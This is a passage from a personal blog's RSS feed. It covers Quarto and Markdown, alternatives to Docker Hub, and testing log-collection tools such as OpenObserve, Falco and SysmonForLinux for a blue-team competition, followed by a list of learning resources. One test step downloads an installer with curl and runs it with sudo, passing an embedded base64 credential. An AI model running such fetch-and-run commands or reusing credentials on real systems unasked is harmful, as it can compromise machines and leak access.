<h2 class="anchored" data-anchor-id="markdown-basics">Markdown Basics</h2>
<p><code>*italics*</code> = <em>italics</em></p>
<p><code>**bold**</code> = <strong>bold</strong></p>
<p><code>[linktext](example.com)</code> = <a href="example.com">linktext</a></p>
</section>
<section id="more-markdwon-basics" class="level2">
<h2 class="anchored" data-anchor-id="more-markdwon-basics">More Markdwon Basics</h2>
<p><br></p>
<p><code># top level header</code></p>
<h1>
top level header
</h1>
<p><br></p>
<p><code>## lower level header</code></p>
<h2 class="anchored">
lower level header
</h2><h2 class="anchored">
</h2></section>
<section id="useful-html-in-markdown" class="level2">
<h2 class="anchored" data-anchor-id="useful-html-in-markdown">Useful HTML in Markdown</h2>
<p><code>&lt;br&gt;</code> = line break</p>
<p><br></p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb3-1"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">details</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">summary</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>summary text<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">summary</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-2"></span>
<span id="cb3-3">collapsable content</span>
<span id="cb3-4"></span>
<span id="cb3-5"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">details</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p><br></p>
<details>
<summary>
summary text
</summary>
collapsable content
</details>
</section>
<section id="quarto" class="level2">
<h2 class="anchored" data-anchor-id="quarto">Quarto</h2>
<ul>
<li>Static site generator</li>
<li>Converts markdown into <code>html</code>, the language powering websites.</li>
<li>Feature Rich by Default
<ul>
<li>Full text search</li>
<li>Light and dark theme</li>
</ul></li>
</ul>
</section>
<section id="quarto-1" class="level2">
<h2 class="anchored" data-anchor-id="quarto-1">Quarto</h2>
<ul>
<li>Outputs: website page, pdf, or presentation (html)</li>
<li>Designed for Data Science, so has integration with Jupyter Notebooks</li>
<li>Does <em>not</em> have any form of templating engine</li>
</ul>
</section>
<section id="template-engine" class="level2">
<h2 class="anchored" data-anchor-id="template-engine">Template Engine</h2>
<p>Not included in Quarto</p>
<pre class="jinja2"><code>{% for i in list %}
  i.attribute
  {% if something %}renderif{% endif %}
{% endfor %}</code></pre>
</section>
<section id="questions-comments-anything-you-want-to-do" class="level2">
<h2 class="anchored" data-anchor-id="questions-comments-anything-you-want-to-do">Questions? Comments? Anything you want to do?</h2>
</section>
<section id="thank-you" class="level1">
<h1>Thank You!</h1>
<p>I hope you use this to host your own blog/site, like I do.</p>


</section>

<div id="quarto-appendix" class="default"><section class="quarto-appendix-contents" id="quarto-reuse"><h2 class="anchored quarto-appendix-heading">Reuse</h2><div class="quarto-appendix-contents"><div><a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a></div></div></section></div> ]]></description>
  <category>talks</category>
  <guid>./talks/self-site/</guid>
  <pubDate>Tue, 25 Feb 2025 08:00:00 GMT</pubDate>
</item>
<item>
  <title>Alternatives to Dockerhub</title>
  <link>./blog/docker-registry/</link>
  <description><![CDATA[ 




<p>Recently, <a href="https://docs.docker.com/docker-hub/usage/">Docker Hub</a>, is setting up rate limit. Unauthenticated users will be limited to 10 pulls per hour, and authenticated users will be limited to 100 pulls per hour.</p>
<p>This could cause issues with setups like CGNAT, and is a very arbitrary image</p>
<p>So, I looked for some alternatives.</p>
<section id="other-public-registries" class="level1">
<h1>Other Public Registries</h1>
<details>
<summary>
Why not a self hosted registry and building our own containers?
</summary>
<p>Most people don’t care about these, instead opting for local builds and registries, but for the <a href="https://wrccdc.org/">CCDC</a> competition, there will be a firewall with an allowlist. It’s easier to ask for a container registry to be unblocked, because container builds will get from so many different websites. In addition to that, we are not allowed to use anything that requires a login, and I do not know if that applies to Docker Hub.</p>
</details>
<section id="general-repos" class="level2">
<h2 class="anchored" data-anchor-id="general-repos">General Repos</h2>
<ul>
<li>Google’s public registry and mirror of dockerhub
<ul>
<li>Located at <code>mirror.gcr.io</code></li>
<li><a href="https://cloud.google.com/artifact-registry/docs">Docs online</a></li>
<li>Because it’s a mirror of Docker Hub, images available here can be searched there</li>
</ul></li>
<li>AWS ECR public registry
<ul>
<li>Has docker official containers and more, but is not a mirror of dockerhub</li>
<li>Located at <code>public.ecr.aws</code></li>
<li>Can be searched at <a href="https://gallery.ecr.aws/" class="uri">https://gallery.ecr.aws/</a></li>
</ul></li>
<li>Github container registry
<ul>
<li>Often where containers are built via CI/CD systems</li>
<li>Located at <code>ghcr.io</code></li>
<li>Does not appear to be searchable</li>
</ul></li>
<li><a href="https://quay.io/">Quay</a>
<ul>
<li>Can be searched at website</li>
<li>By Red Hat</li>
<li>Popular for certain things, but doesn’t have everything</li>
<li>Located at <code>quay.io</code></li>
</ul></li>
<li><a href="https://mcr.microsoft.com/">Microsoft MCR</a>
<ul>
<li>Searchable from website</li>
<li>Popular for many things, but doesn’t have everything</li>
<li>Located at <code>mcr.microsoft.com</code></li>
</ul></li>
</ul>
</section>
<section id="specialized-repos" class="level2">
<h2 class="anchored" data-anchor-id="specialized-repos">Specialized Repos</h2>
<ul>
<li>Linuxserver.io
<ul>
<li>Services specifically designed for homelabbing</li>
<li>Located at <code>lscr.io</code></li>
<li>Searchable at <a href="https://www.linuxserver.io/our-images" class="uri">https://www.linuxserver.io/our-images</a></li>
</ul></li>
<li><a href="https://nixery.dev/">Nixery</a>
<ul>
<li>Automatically creates images from nix packages</li>
<li>Can be self hosted</li>
<li>located at <code>nixery.dev</code></li>
</ul></li>
</ul>
</section>
</section>
<section id="local-registries" class="level1">
<h1>Local Registries</h1>
<p>Most likely, this would also include running your own build system.</p>
<ul>
<li><a href="https://hub.docker.com/_/registry">Official Docker Registry</a></li>
<li><a href="https://github.com/project-zot/zot">Zot</a></li>
<li><a href="https://github.com/distribution/distribution">Distribution</a></li>
<li><a href="https://goharbor.io/docs/2.12.0/administration/configure-proxy-cache/">Harbor</a></li>
</ul>
</section>
<section id="build-systems" class="level1">
<h1>Build Systems</h1>
<ul>
<li><a href="https://github.com/moby/buildkit">Buildkit</a></li>
<li><a href="https://github.com/project-stacker/stacker">Stacker</a>
<ul>
<li>Recommended by <a href="https://zotregistry.dev/v2.1.2/articles/building-ci-cd-pipeline/?">Zot</a> to build a full CI/CD pipeline</li>
</ul></li>
</ul>


</section>

 ]]></description>
  <category>blog</category>
  <guid>./blog/docker-registry/</guid>
  <pubDate>Sat, 22 Feb 2025 08:00:00 GMT</pubDate>
</item>
<item>
  <title>Logging solutions for CCDC</title>
  <link>./playground/ccdc-logs/</link>
  <description><![CDATA[ 




<section id="intro" class="level1">
<h1>Intro</h1>
<p>At Cal State Northridge, I am part of a team that participates in the <a href="https://wrccdc.org/">wrccdc</a> cybersecurity competiion. It’s a blue team competition, that involves securing machines, but also writing “incident responses” when machines are hacked.</p>
<p>In order to write a good incident response, you need, at minimum, the timestamp, what was done, the user, and the ip address. If you do write a good incident response, then you can get up to half of the points you lost from getting hacked back.</p>
<p>In order to collect and save this information, we need some kind of logging solution, that we can search and extract data from.</p>
</section>
<section id="promising-options" class="level1">
<h1>Promising Options</h1>
<p>https://datalust.co/pricing https://github.com/librenms/docker#syslog-ng-container https://corelight.com/ https://en.wikipedia.org/wiki/Zeek https://malcolm.fyi/ https://docs.zeek.org/en/master/about.html#what-is-zeek https://github.com/aquasecurity/tracee https://learn.microsoft.com/en-us/sysinternals/downloads/procmon</p>
</section>
<section id="central-logging-server" class="level1">
<h1>Central Logging Server</h1>
<p>Firstly, we need some kind of central logging server. I really like options like <a href="https://graylog.org/">graylog</a>, or even better is <a href="https://wazuh.com">wazuh</a>, which is a full “Endpoint Defense System” (EDR), which collects data with a security focus and lets you search it.</p>
<p>However, both of those options have a big downside, which is that the underlying software they use, Elasticsearch, Logtash, and Kibana (ELK stack) are very resource intensive, and somewhat unsuitable for every competition machine.</p>
<section id="zinc" class="level2">
<h2 class="anchored" data-anchor-id="zinc">Zinc</h2>
<p><a href="https://github.com/zincsearch/zincsearch">Zinc</a> is the most promising option. It is a super lightweight version of Elasticsearch and Kibana, and boasts a compatible API (although I think we won’t need that right now).</p>
<p>The <a href="https://zincsearch-docs.zinc.dev/">documentation</a> is excellent, and deployment is easy:</p>
<p>From the <a href="https://zincsearch-docs.zinc.dev/quickstart/">quickstart</a></p>
<pre><code>docker run -v /full/path/of/data:/data -e ZINC_DATA_PATH="/data" -p 4080:4080 \
    -e ZINC_FIRST_ADMIN_USER=admin -e ZINC_FIRST_ADMIN_PASSWORD=Complexpass#123 \
    --name zincsearch public.ecr.aws/zinclabs/zincsearch:latest</code></pre>
<p>Another important thing is <a href="https://zincsearch-docs.zinc.dev/ingestion/">log ingestion</a>. Although I don’t recognize most of the options there, I do recognize <a href="https://www.syslog-ng.com/community/b/blog/posts/another-use-for-the-syslog-ng-elasticsearch-http-destination-zinc">syslog</a>, which is a general protocol for forwarding logs around. However, this setup seems to require syslog-ng 2.32 or newer, which is <a href="https://repology.org/project/syslog-ng/versions">not available on all operating systems</a>.</p>
<p>Perhaps this software could be used in combination with fluentd, which can intake <a href="https://docs.fluentd.org/input/syslog">syslog</a> and output it to an <a href="https://docs.fluentd.org/output/elasticsearch">elasticsearch</a> source.</p>
<details>
<summary>
Expand/Collapse Testing
</summary>
<p>I spun up a podman container with:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">podman run -it --rm -p 4080:4080 -e ZINC_FIRST_ADMIN_USER=admin -e ZINC_FIRST_ADMIN_PASSWORD=password public.ecr.aws/zinclabs/zincsearch:latest</span></code></pre></div>
<p>And it was up instantly:</p>
<p><img src="./playground/ccdc-logs/images/zincsearch.jpg" class="img-fluid"></p>
</details>
</section>
<section id="openobserve" class="level2">
<h2 class="anchored" data-anchor-id="openobserve">OpenObserve</h2>
<p><a href="https://openobserve.ai/">Openobsever</a> is similar to Zinc, a lightweight alterntive to an Elasticsearch. It also seems to be able to <a href="https://openobserve.ai/docs/ingestion/logs/syslog/">ingest syslogs directly</a>.</p>
<p>They also seem to have a <a href="https://openobserve.ai/docs/quickstart/#__tabbed_1_3">docker quickstart</a>.</p>
<details>
<summary>
Expand/Collapse testing
</summary>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">podman run -e ZO_DATA_DIR="/data" --network=host -e ZO_ROOT_USER_EMAIL="root@example.com" -e ZO_ROOT_USER_PASSWORD="password" docker.io/openobserve/openobserve:latest</span></code></pre></div>
<p>Similar to Zinc (I think they’re by the same people), it comes up very quickly.</p>
<p><img src="./playground/ccdc-logs/images/openobserver.jpg" class="img-fluid"></p>
<p>It also seems to come with script which I can run on Linux or Windows machines, that will install an agent to ingest logs.</p>
<p>I spun up a debian vagrant machine as a test, so I can run the command.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">curl -O https://raw.githubusercontent.com/openobserve/agents/main/linux/install.sh &amp;&amp; chmod +x install.sh &amp;&amp; sudo ./install.sh http://192.168.121.1:5080/api/default/ cm9vdEBleGFtcGxlLmNvbTpzWlAyMXF1VFpCQmFpa3hp</span></code></pre></div>
<p>Although I love the ease of install, the search interface is unintuitive, and it doesn’t seem to log anything other than this one bit about the logging process itself.</p>
<p><img src="./playground/ccdc-logs/images/openobserverlogs.jpg" class="img-fluid"></p>
<p>Well, there also seems to be a “default” cateogry, which informs me of apt upgrades but not much else.</p>
<p>I attempted to install SysmonForLinux, but the logs that generates don’t seem to be forwarded by default. It seems like the OpenObserve agent catches journald and apt logs, but not actual syslogs.</p>
<p>I can forward syslogs though, <a href="https://openobserve.ai/docs/ingestion/logs/syslog/">by having openobserve act as a syslog server</a></p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">apt install rsyslog</span></code></pre></div>
<p><a href="https://wiki.archlinux.org/title/Rsyslog#journald's_syslog-forward_feature">Forward journald messages to syslog</a>, and then I could <a href="https://www.rsyslog.com/sending-messages-to-a-remote-syslog-server/">forward syslog messages to a remote server using rsyslog</a>.</p>
<p>And for a brief period, logs were working, but then they deleted themselves and I can no longer search for them. The issue seems to be somehow related to SysmonForLinux, because after disabling that, it works.</p>
</details>
</section>
<section id="signoz" class="level2">
<h2 class="anchored" data-anchor-id="signoz">Signoz</h2>
<p><a href="https://signoz.io/docs/">Signoz</a> is another FOSS central logging service.</p>
<p>It can <a href="https://signoz.io/docs/userguide/collecting_syslogs/">collect syslogs</a></p>
<p>It looks to have a much more usable search interface.</p>
</section>
<section id="loki" class="level2">
<h2 class="anchored" data-anchor-id="loki">Loki</h2>
<p><a href="https://grafana.com/oss/loki/">Loki</a>, by grafana, is a another log aggregator. But it seems to be a bit bigger and more complex than what we want.</p>
</section>
</section>
<section id="windows" class="level1">
<h1>Windows</h1>
<section id="collection" class="level2">
<h2 class="anchored" data-anchor-id="collection">Collection</h2>
<section id="sysmon" class="level3">
<h3 class="anchored" data-anchor-id="sysmon">Sysmon</h3>
<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> is a popular solution for process monitoring on Windows. It is very useful, and very powerful as is, but I would like some kind of way to forward logs to a Security Information and Event Management (SIEM) solution in the future.</p>
</section>
</section>
<section id="forwarding" class="level2">
<h2 class="anchored" data-anchor-id="forwarding">Forwarding</h2>
<section id="fluentd" class="level3">
<h3 class="anchored" data-anchor-id="fluentd">Fluentd</h3>
<p><a href="https://docs.fluentd.org/input/windows_eventlog">Fluentd</a> is a software for collecting and forwarding logs, and it seems to be able to collect the Windows event logs. However, I don’t know how useful that kind of log is, and I don’t know if Sysmon counts as that type of log.</p>
</section>
<section id="windows-syslog" class="level3">
<h3 class="anchored" data-anchor-id="windows-syslog">Windows Syslog</h3>
<p><a href="https://www.winsyslog.com">winsyslog</a>, by the developers of rsyslog.</p>
</section>
</section>
</section>
<section id="linux" class="level1">
<h1>Linux</h1>
<section id="collection-1" class="level2">
<h2 class="anchored" data-anchor-id="collection-1">Collection</h2>
<p>With Linux, there are two ways to do log collection that are superior: Hooking into the kernel and listening to syscalls/file interactions, or epbf which can do something similar. Other, polling based solutions for logging, may not work because they may be too slow and miss events, and they may not offer the performance we need.</p>
<section id="falco" class="level3">
<h3 class="anchored" data-anchor-id="falco">Falco</h3>
<p><a href="https://falco.org/">Falco</a> is a security solution that works by collecting logs and forwarding them</p>
<p>What I really like about Falco, is the fact that it can be <a href="https://falco.org/docs/setup/container/">deployed as a container</a>, yet it still hooks into the host system and collects logs.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">docker pull falcosecurity/falco:latest</span>
<span id="cb6-2">docker run --rm -it \</span>
<span id="cb6-3">           --privileged \</span>
<span id="cb6-4">           -v /var/run/docker.sock:/host/var/run/docker.sock \</span>
<span id="cb6-5">           -v /proc:/host/proc:ro \</span>
<span id="cb6-6">           -v /etc:/host/etc:ro \</span>
<span id="cb6-7">           falcosecurity/falco:latest</span></code></pre></div>
<p>In addition to that, it can forward it’s collected logs to <a href="https://falco.org/docs/concepts/outputs/forwarding/">elasticsearch, zincsearch, or syslog</a>.</p>
</section>
<section id="sysmonforlinux" class="level3">
<h3 class="anchored" data-anchor-id="sysmonforlinux">SysmonForLinux</h3>
<p><a href="https://github.com/microsoft/SysmonForLinux">SysmonForLinux</a> is a (now) Microsoft project that brings sysmon to Linux. It also seems to output to syslog by default.</p>
<details>
<summary>
Expand/Collapse Testing
</summary>
<p>Installing it was simple, I followed the <a href="https://github.com/microsoft/SysmonForLinux/blob/main/INSTALL.md">install instructions for Debian 12</a>.</p>
<p>Then, I started the service.</p>
<p>To view the syslogs, I can use:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb7-1">cat /var/log/syslog | /opt/sysmon/sysmonLogView | less</span></code></pre></div>
<p>Although sadly, it does not seem to inform me of ssh processes, it does give quite a bit of information, mainly about processes being started and stopped. Here is a sample:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb8-1">Event SYSMONEVENT_CREATE_PROCESS</span>
<span id="cb8-2">        RuleName: -</span>
<span id="cb8-3">        UtcTime: 2025-02-18 19:59:41.656</span>
<span id="cb8-4">        ProcessGuid: {5304214a-e6ad-67b4-a5e6-724d9e550000}</span>
<span id="cb8-5">        ProcessId: 2701</span>
<span id="cb8-6">        Image: /opt/sysmon/sysmonLogView</span>
<span id="cb8-7">        FileVersion: -</span>
<span id="cb8-8">        Description: -</span>
<span id="cb8-9">        Product: -</span>
<span id="cb8-10">        Company: -</span>
<span id="cb8-11">        OriginalFileName: -</span>
<span id="cb8-12">        CommandLine: /opt/sysmon/sysmonLogView</span>
<span id="cb8-13">        CurrentDirectory: /var/log</span>
<span id="cb8-14">        User: root</span>
<span id="cb8-15">        LogonGuid: {5304214a-0000-0000-0000-000001000000}</span>
<span id="cb8-16">        LogonId: 0</span>
<span id="cb8-17">        TerminalSessionId: 5</span>
<span id="cb8-18">        IntegrityLevel: no level</span>
<span id="cb8-19">        Hashes: SHA256=ac099d5fd9305b8c68f247415aebc56d35af953ede6782856b8e1c206efaad87</span>
<span id="cb8-20">        ParentProcessGuid: {00000000-0000-0000-0000-000000000000}</span>
<span id="cb8-21">        ParentProcessId: 1713</span>
<span id="cb8-22">        ParentImage: -</span>
<span id="cb8-23">        ParentCommandLine: -</span>
<span id="cb8-24">        ParentUser: -</span></code></pre></div>
</details>
</section>
</section>
<section id="forwarding-1" class="level2">
<h2 class="anchored" data-anchor-id="forwarding-1">Forwarding</h2>
<section id="fluentd-1" class="level3">
<h3 class="anchored" data-anchor-id="fluentd-1">Fluentd</h3>
<p><a href="https://docs.fluentd.org/input/syslog">Fluentd</a> seems to support syslog collection.</p>
</section>
<section id="rsyslog" class="level3">
<h3 class="anchored" data-anchor-id="rsyslog">Rsyslog</h3>
<p><a href="https://en.wikipedia.org/wiki/Rsyslog">Rsyslog</a> uses the syslog protocol to forward logs around. However, not all software supports ingesting syslogs.</p>


</section>
</section>
</section>

 ]]></description>
  <category>playground</category>
  <guid>./playground/ccdc-logs/</guid>
  <pubDate>Tue, 18 Feb 2025 08:00:00 GMT</pubDate>
</item>
<item>
  <title>Free resources to learn various things</title>
  <link>./guides/learn-linux/</link>
  <description><![CDATA[ 




<p>My browser bookmarks bar is massive. I basically bookmark anything interesting I come across, and now I have a lot of resources accumulated, and I think it’s worth it to write them down, although formatting is still a work in progress.</p>
<p>I have a heavy preference for Free and Open Source resources, because I believe that things like wikibooks will be much more resilient in the long run, and stay up. I’ve seen similar lists of learning, and it is frustrating when I’m no longer able to buy or view one of the textbooks on the list.</p>
<p>I also like resources maintained by some kind of organization, either the official organzition behind the software (think Microsoft and powershell), or a nonprofit, (Overthewire), because again, I think they will be more resilient in the long run.</p>
<section id="linux" class="level1">
<h1>Linux</h1>
<p><a href="https://linuxupskillchallenge.org/">Linux Up Skill Challenge</a></p>
<ul>
<li>This is definitely one of my favorites. They mention that they don’t have a free server for people to work with. However, many of the cloud providers offer 1 year’s worth of credit’s for a free server. Most notably, Oracle has an always free tier, which offers a very small server. I recommend this, because you don’t have to give up your credit/debit card information (dealing with cloud provider pricing can be… difficult), although Oracle has been known to randomly delete people on the “Truly Free” (no credit card) tier, to make room for paying customers.
<ul>
<li>Related: <a href="https://github.com/cloudcommunity/Cloud-Free-Tier-Comparison">Comparison of cloud provider free tiers</a></li>
</ul></li>
</ul>
<p><a href="https://overthewire.org/wargames/bandit/">OverTheWire Bandit</a></p>
<ul>
<li>OverTheWire Bandit is a bit different from the other resources on this list. When I first used it, both personally and as a teaching tool, I was frustrated, because some of the commands it makes you use, will probably never show up in a real world usecase. I was frustrated with it’s “trickyness”, but I now realize the point of overthewire isn’t to teach commands, but to teach reading the manual. The answer to every challenge they give can be found in <a href="https://en.wikipedia.org/wiki/Man_page">manpages</a>, the built in Linux documentation.</li>
</ul>
<p><a href="https://learning.lpi.org/en/learning-materials/learning-materials/">Linux Professional Institute Free resources</a></p>
<ul>
<li>The free books they give out for the LPIC-1 and LPIC-2 exam are some of the best books I’ve seen in terms of teaching Linux.</li>
</ul>
<p><a href="https://training.linuxfoundation.org/resources/?_sft_content_type=free-course">Linux Foundation Free Training</a></p>
<ul>
<li>Their <a href="https://training.linuxfoundation.org/training/introduction-to-linux/">Intro to Linux</a> seems to be good</li>
<li><a href="https://www.cncf.io/training/courses/?_sfm_lf_course_free=1" class="uri">https://www.cncf.io/training/courses/?_sfm_lf_course_free=1</a></li>
</ul>
<p><a href="https://web.mit.edu/mprat/Public/web/Terminus/Web/main.html">Terminus</a> — A linux tutorial in the style of a text based rpg.</p>
<p><a href="https://linuxsurvival.com/linux-tutorial-introduction/">Linux Survival</a></p>
<p><a href="https://ryanstutorials.net/linuxtutorial/" class="uri">https://ryanstutorials.net/linuxtutorial/</a></p>
<p><a href="https://eng.libretexts.org/Bookshelves/Computer_Science/Operating_Systems/Linux_-_The_Penguin_Marches_On_(McClanahan)">Linux — The Penguin Marches On (Libretexts)</a></p>
<p><a href="https://help.ubuntu.com/community/UsingTheTerminal">Ubuntu’s Terminal Basics</a></p>
<p><a href="https://professionallinuxusersgroup.github.io/lac/">Het-Tanis Linux Course</a></p>
<section id="ansible" class="level2">
<h2 class="anchored" data-anchor-id="ansible">Ansible</h2>
<p><a href="https://killercoda.com/het-tanis/course/Ansible-Labs">Het-Tanis Lab on Killercoda</a></p>
</section>
<section id="dockerkubernetescontainers" class="level2">
<h2 class="anchored" data-anchor-id="dockerkubernetescontainers">Docker/Kubernetes/Containers</h2>
<p><a href="https://training.play-with-docker.com/">Play with Docker Classroom</a></p>
<ul>
<li>There is also the <a href="https://labs.play-with-docker.com/">lab</a> where you can just play in an unstructured environment</li>
</ul>
<p><a href="https://training.play-with-kubernetes.com/">Play with Kubernetes Classroom</a></p>
<ul>
<li>There is also the <a href="https://labs.play-with-k8s.com/">lab</a>, an unstructured environemnt to play</li>
</ul>
<p><a href="https://container.training/">container.training</a></p>
<ul>
<li>The “<a href="https://pycon2019.container.training/#1">Getting started with Kubernetes and container orchestration</a>” is one of the better resources I’ve seen on Kubernetes concepts.</li>
</ul>
<p><a href="https://killercoda.com/" class="uri">https://killercoda.com/</a></p>
<ul>
<li>Interactive courses relating to a variety of topics, including Linux basics, Ansible, and Kubernetes. Requires login, although Github login can be used.</li>
</ul>
<p><a href="https://kubebyexample.com/learning-paths" class="uri">https://kubebyexample.com/learning-paths</a></p>
<ul>
<li>Not interactive, but follow-along labs for Linux fundamentals, containers, and kubernetes.</li>
</ul>
</section>
<section id="troubleshooting-servers" class="level2">
<h2 class="anchored" data-anchor-id="troubleshooting-servers">Troubleshooting servers</h2>
<p><a href="https://sadservers.com/">SadServers</a></p>
<ul>
<li>Interactive troubleshooting of broken Linux servers.</li>
</ul>
</section>
<section id="sre" class="level2">
<h2 class="anchored" data-anchor-id="sre">SRE</h2>
</section>
</section>
<section id="windows" class="level1">
<h1>Windows</h1>
<section id="active-directory" class="level2">
<h2 class="anchored" data-anchor-id="active-directory">Active Directory</h2>
<p><a href="https://learn.microsoft.com/en-us/training/paths/administer-active-directory-domain-services/">Microsoft</a></p>
<p><a href="https://adsecurity.org/?page_id=41">Adsecurity</a> (List of resources)</p>
</section>
</section>
<section id="devops" class="level1">
<h1>Devops</h1>
<p>https://learnk8s.io/troubleshooting-deployments https://wellarchitectedlabs.com/security/</p>
<p><a href="https://nubenetes.com/" class="uri">https://nubenetes.com/</a> <a href="https://sre.google/sre-book/table-of-contents/" class="uri">https://sre.google/sre-book/table-of-contents/</a></p>
</section>
<section id="programming" class="level1">
<h1>Programming</h1>
<section id="rust" class="level2">
<h2 class="anchored" data-anchor-id="rust">Rust</h2>
<p><a href="https://doc.rust-lang.org/book/title-page.html">The Rust Programming Language</a></p>
<p><a href="https://bfnightly.bracketproductions.com/rustbook/chapter_0.html">Roguelike Tutorial in Rust</a></p>
<p><a href="https://play.rust-lang.org/">Rust playground</a> — open ended web based playground for rust.</p>
</section>
<section id="c" class="level2">
<h2 class="anchored" data-anchor-id="c">C</h2>
<p><a href="https://en.wikiversity.org/wiki/C_Programming">Wikiversity</a></p>
<p><a href="https://en.wikibooks.org/wiki/C_Programming">Wikibooks</a></p>
</section>
<section id="python" class="level2">
<h2 class="anchored" data-anchor-id="python">Python</h2>
<p><a href="https://en.wikibooks.org/wiki/Python_Programming">Wikibooks Python Programming</a></p>
<p><a href="https://automatetheboringstuff.com/#toc">Automate the Boring Stuff with Python</a> — Practical guide which focuses on automating mundane tasks like web scraping.</p>
<p><a href="https://en.wikibooks.org/wiki/Non-Programmer%27s_Tutorial_for_Python_3">Wikibooks Python for the Non Programmer</a> — Similar to automate the boring stuff in python, it focuses on introducing python and programming to a non programmer.</p>
</section>
<section id="c-1" class="level2">
<h2 class="anchored" data-anchor-id="c-1">C#</h2>
<p><a href="https://en.wikibooks.org/wiki/C_Sharp_Programming">Wikibooks</a></p>
<p><a href="https://learn.microsoft.com/en-us/dotnet/csharp/fundamentals/program-structure/">Microsoft</a> ­— Also seems to have some interactive resources in the form of modules</p>
</section>
<section id="java" class="level2">
<h2 class="anchored" data-anchor-id="java">Java</h2>
<p><a href="https://en.wikibooks.org/wiki/Java_Programming">Wikibooks</a></p>
</section>
<section id="powershell" class="level2">
<h2 class="anchored" data-anchor-id="powershell">Powershell</h2>
<p><a href="https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/00-introduction?view=powershell-7.5">Powershell 101</a> — and in general this is</p>
</section>
<section id="bash" class="level2">
<h2 class="anchored" data-anchor-id="bash">Bash</h2>
<p><a href="https://en.wikibooks.org/wiki/Bash_Shell_Scripting">Wikibooks</a></p>
</section>
</section>
<section id="documentation-writing" class="level1">
<h1>Documentation (writing)</h1>
<p><a href="https://documentation.divio.com/">Divio Documentation System</a> — More about differences between the types of documentation; there’s actually 4 types.</p>
<ul>
<li>I really like this one to explain the differences between the four types of documentation: tutorial, how-to, reference, and explanation.</li>
</ul>
<p><a href="https://jamesg.blog/book.pdf">Software Technical Writings — A guidebook (pdf)</a> — nitty gritty technical writing details.</p>
</section>
<section id="teaching" class="level1">
<h1>Teaching</h1>
<p><a href="https://pages.gseis.ucla.edu/faculty/agre/how-to-help.html">How to help someone use a computer (1996)</a></p>
</section>
<section id="git" class="level1">
<h1>Git</h1>
<p><a href="https://shafiul.github.io/gitbook/index.html" class="uri">https://shafiul.github.io/gitbook/index.html</a></p>
<ul>
<li>Data structure oriented guide to git. It starts at explaining what an object is, rather than how the command line works. I like this guide of git more than many other guides I’ve seen, although it’s still missing things (yes, git does a snapshot of the repo’s state at every point, as seperate objects, but it deduplicates data between those objects).</li>
</ul>
<p><a href="https://missing.csail.mit.edu/2020/version-control/">Missing Semester</a></p>
<p><a href="https://programming.dev/post/26285997">Set of tutorials from Lemmy</a></p>
<p><a href="https://learngitbranching.js.org/" class="uri">https://learngitbranching.js.org/</a> ­— Interactive, browser based game to learn git</p>
<p><a href="https://ohmygit.org/" class="uri">https://ohmygit.org/</a> — Computer game to learn git</p>
<p><a href="https://git-scm.com/book/en/v2">Pro Git book</a></p>
</section>
<section id="computer-science" class="level1">
<h1>Computer Science</h1>
<p><a href="https://hefferon.net/computation/">Heffron’s Theory of Computation</a></p>
<section id="data-structures" class="level2">
<h2 class="anchored" data-anchor-id="data-structures">Data Structures</h2>
<p><a href="https://en.wikibooks.org/wiki/Data_Structures/">Wikibooks</a></p>
</section>
<section id="low-level-operating-system-programming" class="level2">
<h2 class="anchored" data-anchor-id="low-level-operating-system-programming">Low Level Operating System Programming</h2>
<p><a href="https://pages.cs.wisc.edu/~remzi/teaching/" class="uri">https://pages.cs.wisc.edu/~remzi/teaching/</a></p>
<p><a href="https://pages.cs.wisc.edu/~remzi/OSTEP/" class="uri">https://pages.cs.wisc.edu/~remzi/OSTEP/</a></p>
<p><a href="https://wiki.osdev.org/Expanded_Main_Page" class="uri">https://wiki.osdev.org/Expanded_Main_Page</a></p>
</section>
<section id="architecture-and-assembly" class="level2">
<h2 class="anchored" data-anchor-id="architecture-and-assembly">Architecture and Assembly</h2>
<p><a href="https://en.wikibooks.org/wiki/MIPS_Assembly">MIPS Wikibooks</a></p>
<p><a href="https://en.wikibooks.org/wiki/A-level_Computing/AQA">AA Level Computing (AQA) Wikibook</a></p>
</section>
</section>
<section id="math" class="level1">
<h1>Math</h1>
<p><a href="https://projecteuler.net/archives">Project Euler</a> — A set of CTF like challenges, but for mathmatics.</p>
<p><a href="https://math.libretexts.org/Bookshelves/Combinatorics_and_Discrete_Mathematics/A_Spiral_Workbook_for_Discrete_Mathematics_(Kwong)">A Spiral Workbook for Discrete Mathematics (Kwong)</a></p>
<section id="calculus" class="level2">
